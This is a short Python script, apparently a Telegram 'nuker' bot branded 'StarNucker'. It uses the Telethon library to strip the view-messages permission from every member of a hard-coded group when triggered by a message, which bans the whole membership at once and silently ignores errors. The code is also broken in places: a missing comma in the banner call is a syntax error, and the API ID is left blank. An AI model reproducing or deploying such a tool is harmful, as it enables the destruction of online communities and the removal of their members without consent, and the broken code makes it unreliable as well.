from telethon import TelegramClient,events,Button
from telethon.tl import functions
from telethon.tl import types
from telethon.tl.types import *
from telethon.errors import *
from pyfiglet import figlet_format
import os

start = figlet_format('StarNucker' font = "graffiti")

API_ID = 
API_HASH = ""
TOKEN = ""
client=TelegramClient("banallbot",api_id=API_ID,api_hash=API_HASH)
client.start(bot_token=TOKEN)
print('Bot Run, start')

chat = -1001451069191
@client.on(events.NewMessage(pattern="Start"))
async def deleter(event):
    try:
	    idbot = await client.get_me()
	    idd = idbot.id
	    x=await client.get_participants(chat)
	    for i in x:
	    	if i.id == idd:
	    		pass
	    	else:
	    		await client.edit_permissions(chat, i.id, view_messages=False)
    except: pass
client.run_until_disconnected()
